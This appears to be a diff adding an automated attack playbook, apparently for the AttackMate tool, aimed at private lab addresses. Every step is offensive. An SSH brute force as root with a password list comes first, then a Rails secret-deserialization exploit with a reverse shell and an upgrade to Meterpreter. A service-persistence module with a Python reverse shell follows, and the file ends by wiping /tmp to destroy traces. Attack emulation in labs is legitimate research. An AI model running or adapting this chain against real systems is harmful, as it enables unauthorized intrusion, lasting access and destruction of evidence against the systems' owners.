@@ -1,0 +1,72 @@
+commands:
+
+  - type: msf-module
+    cmd: "auxiliary/scanner/ssh/ssh_login"
+    options:
+      RHOSTS: "192.168.56.181"
+      RPORT: "22"
+      USERNAME: "root"
+      PASS_FILE: "/home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt"
+      
+  - type: sleep
+    seconds: 15
+    description: "Sleep 15 seconds"
+
+  - type: msf-module
+    cmd: "exploit/multi/http/rails_secret_deserialization"
+    payload: "ruby/shell_reverse_tcp"
+    payload_options:
+      LHOST: "192.168.56.181"
+      LPORT: "4444"
+    options:
+      RHOSTS: "192.168.56.191"
+      RPORT: "8181"
+      TARGETURI: "/"
+      SECRET: "a7aebc287bba0ee4e64f947415a94e5f"
+      
+  - type: msf-module
+    cmd: "post/multi/manage/shell_to_meterpreter"
+    options:
+      SESSION: "1"
+      
+  - type: sleep
+    seconds: 15
+    description: "Sleep 15 seconds"
+    
+  - type: msf-module
+    cmd: "exploit/linux/local/service_persistence"
+    payload: "cmd/unix/reverse_python"
+    payload_options:
+      LHOST: "192.168.56.191"
+    options:
+      SESSION: "1"
+      VERBOSE: "true"
+      
+  - type: shell
+    cmd: "sessions -k 1,2,3"
+    description: "Kill session 1, 2, 3"
+    
+  - type: sleep
+    seconds: 15
+    description: "Sleep 15 seconds"
+
+  - type: msf-module
+    cmd: "exploit/multi/handler"
+    payload: "cmd/unix/reverse_python"
+    payload_options:
+      LHOST: "192.168.56.191"
+    options:
+      SESSION: "4"
+      VERBOSE: "true"
+      
+  - type: sleep
+    seconds: 15
+    description: "Sleep 15 seconds"
+    
+  - type: msf-session
+    cmd: "apt install wipe -y"
+    session: "4"
+    
+  - type: msf-session
+    cmd: "wipe -f /tmp"
+    session: "4"
